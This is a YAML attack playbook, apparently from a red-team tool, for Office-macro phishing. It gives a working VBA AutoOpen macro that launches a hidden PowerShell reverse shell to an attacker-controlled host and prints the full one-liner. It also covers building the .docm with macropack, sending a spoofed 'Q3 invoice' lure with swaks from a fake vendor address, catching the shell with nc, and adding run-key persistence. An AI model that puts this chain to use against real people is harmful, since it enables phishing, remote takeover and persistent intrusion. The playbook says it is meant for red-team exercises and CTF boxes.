id: office-macro-initial-access
name: "Phishing — Office macro initial access → C2 shell"
description: >
  Classic phishing chain. .docm with a VBA AutoOpen handler pulls down a
  PowerShell stager (or Cobalt Strike / Sliver / Mythic beacon) and runs
  in the user's context. Useful for red-team exercises and HTB "Reel"
  style boxes.
tags: [phishing, initial-access, office-macro, vba, classic-windows]
difficulty: medium

inputs:
  - name: lure_subject
    description: "Email subject for the lure."
    required: true
  - name: target_email
    required: true

steps:
  - id: payload_choice
    name: "Pick the payload (PowerShell vs Beacon)"
    inline_command: "echo 'PowerShell oneliner — fastest, no C2.\\nMythic / Sliver / CS beacon — full C2, persistence, lateral.\\nFor CTFs: powershell -nop -w hidden -enc <base64> is enough.'"

  - id: craft_macro
    name: "Craft the VBA AutoOpen macro"
    inline_command: |
      cat > /tmp/macro.bas <<'EOF'
      Sub AutoOpen()
          Shell "powershell.exe -nop -w hidden -enc <BASE64_OF_REVERSE_SHELL>"
      End Sub
      Sub Document_Open()
          AutoOpen
      End Sub
      EOF
      # Encode the PS:
      echo '$client = New-Object System.Net.Sockets.TCPClient("<lhost>",<lport>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w 0
    inputs:
      lhost: "${attacker_ip}"
      lport: "4444"

  - id: build_docm
    name: "Build the .docm with the macro embedded"
    inline_command: |
      # Easiest: open LibreOffice → new document → Tools → Macros → paste,
      # save as .docm with the macro signature.
      # Or generate from CLI with macropack:
      pip install macropack
      macropack -m /tmp/macro.bas -t WORD -o /tmp/invoice_q3.docm

  - id: send_lure
    name: "Send the lure email"
    inline_command: |
      swaks --server '<smtp>' --to '<email>' \
        --from 'accounting@trusted-vendor.com' \
        --header 'Subject: <subject>' \
        --body 'Hi, please find the attached Q3 invoice.' \
        --attach /tmp/invoice_q3.docm \
        --attach-name 'Invoice-Q3.docm'
    inputs:
      smtp: "<smtp_server>"
      email: "${target_email}"
      subject: "${lure_subject}"

  - id: catch_shell
    name: "Catch the reverse shell"
    inline_command: "rlwrap nc -lvnp <lport>"
    inputs:
      lport: "4444"

  - id: persistence_immediate
    name: "Quick persistence (run-key) before the user logs out"
    inline_command: |
      reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "powershell -nop -w hidden -enc <BASE64>" /f

references:
  - title: "MITRE T1204.002 (User Execution: Malicious File)"
    url:   "https://attack.mitre.org/techniques/T1204/002/"
  - title: "HackTricks — Phishing methodology"
    url:   "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/phishing-methodology/index.html"

next_chains:
  - chain: shell-stabilization
    when:   'PowerShell shell received'
    reason: 'Stabilize before doing AD work.'
  - chain: dpapi-secrets-extraction
    when:   'shell on a workstation'
    reason: 'User context has DPAPI of the logged-on user.'
  - chain: ldap-anonymous-enum
    when:   'shell on a domain-joined host'
    reason: 'Start AD enumeration with the user context.'
